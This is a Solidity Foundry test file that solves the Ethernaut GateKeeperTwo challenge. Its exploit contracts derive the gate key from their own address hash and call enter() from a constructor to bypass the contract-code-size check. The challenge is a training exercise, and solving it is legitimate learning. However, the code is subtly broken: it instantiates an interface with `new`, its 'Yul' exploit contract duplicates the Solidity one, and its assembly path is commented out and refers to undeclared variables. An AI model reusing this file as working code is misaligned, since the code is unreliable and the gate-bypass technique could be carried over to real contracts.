// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {IGateKeeperTwo} from "ethernaut/14GateKeeperTwo.sol";
import {BaseTest} from "./BaseTest.t.sol";

contract GateKeeperTwoExploit {
    constructor(IGateKeeperTwo gateKeeperTwoInstance) {
        uint64 _a = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 _gateKey = (_a ^ type(uint64).max);     
        gateKeeperTwoInstance.enter(bytes8(_gateKey));
    }
}

contract GateKeeperTwoExploitYul {
    constructor(IGateKeeperTwo gateKeeperTwoInstance) {
        uint64 _a = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 _gateKey = (_a ^ type(uint64).max);     
        gateKeeperTwoInstance.enter(bytes8(_gateKey));
    }
}

contract GateKeeperTwoTest is BaseTest {
    // IGateKeeperTwo public gateKeeperTwoInstance = IGateKeeperTwo(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
    IGateKeeperTwo public gateKeeperTwoInstance = new IGateKeeperTwo();

    function setUp() public override {
        super.setUp();
    }

    function exploitSol() internal override {
        new GateKeeperTwoExploit(gateKeeperTwoInstance);
    }
    

    function testExploitSol() public override {
        exploitSol();
        assertEq(gateKeeperTwoInstance.entrant(), tx.origin);
    }

    function exploitYul() internal override {
        bytes memory initCode = type(GateKeeperTwoExploit).creationCode;
        assembly {
            let size := mload(initCode)
        //     mstore(initCode, add(size, 0x20))
        //     mstore(add(initCode, add(0x20, size)), sload(instance.slot))
        //     pop(create(0, add(initCode, 0x20), mload(initCode)))

        //     mstore(0, "entrant()")
        //     mstore(0, keccak256(0, 9))
        //     pop(staticcall(gas(), sload(instance.slot), 0, 4, 0, 32))
        //     if iszero(eq(mload(0), sload(player.slot))) {
        //         revert(0, 0)
        //     }
        }
    }

    function testExploitYul() public override {
        exploitYul();
    }
    function testExploitYulX() public {
        exploitYul();
    }
}
